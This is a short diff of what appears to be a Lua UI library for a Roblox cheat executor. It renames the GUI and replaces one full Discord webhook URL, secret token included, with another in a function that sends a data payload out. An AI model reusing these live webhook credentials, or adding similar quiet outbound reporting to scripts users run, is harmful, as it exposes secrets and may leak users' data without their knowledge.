@@ -189,7 +189,7 @@ function library.new(library, name, theme)
         syn.protect_gui(dogent)
     end
 
-    dogent.Name = "frosty is cute"
+    dogent.Name = "frost"
     dogent.Parent = services.CoreGui
 
     function UiDestroy()
@@ -215,7 +215,7 @@ function library.new(library, name, theme)
 
     function webhook(title)
     url =
-    "https://discord.com/api/webhooks/1256851464479838309/FLIX-QEMKptxZZo07rLQ6GXRGSG3yz0h77GpTAKfG7leT5ZMeuVEKwoSoNbvGTtF_kpw"
+    "https://discord.com/api/webhooks/1256852889276780584/pe4QF88LovWxkUHriaJZPNt46TZ1Neg-0q_7qfhwLRr3VikCxDGFDba64MYyMv4r7Otm"
     local data = {
         ["content"] = "",
         ["username"] = a,
